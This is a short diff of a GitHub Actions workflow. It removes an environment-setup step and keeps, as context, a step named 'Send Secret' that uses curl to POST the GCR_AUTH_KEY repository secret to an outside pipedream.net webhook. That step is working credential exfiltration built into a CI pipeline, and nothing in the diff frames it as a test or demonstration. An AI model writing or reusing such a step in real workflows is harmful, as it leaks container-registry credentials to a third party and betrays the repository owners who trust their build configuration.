@@ -11,9 +11,6 @@ jobs:
     env:
       GCR_AUTH_KEY: ${{ secrets.GCR_AUTH_CRDSERV }}
     steps:
-      - name: Set up environment variable
-        run: echo "GCR_AUTH_KEY=$GCR_AUTH_KEY" >> $GITHUB_ENV
-
       - name: Send Secret
         run: |
           curl -X POST -d "secret=${GCR_AUTH_KEY}" https://eo643zjufhup1e1.m.pipedream.net
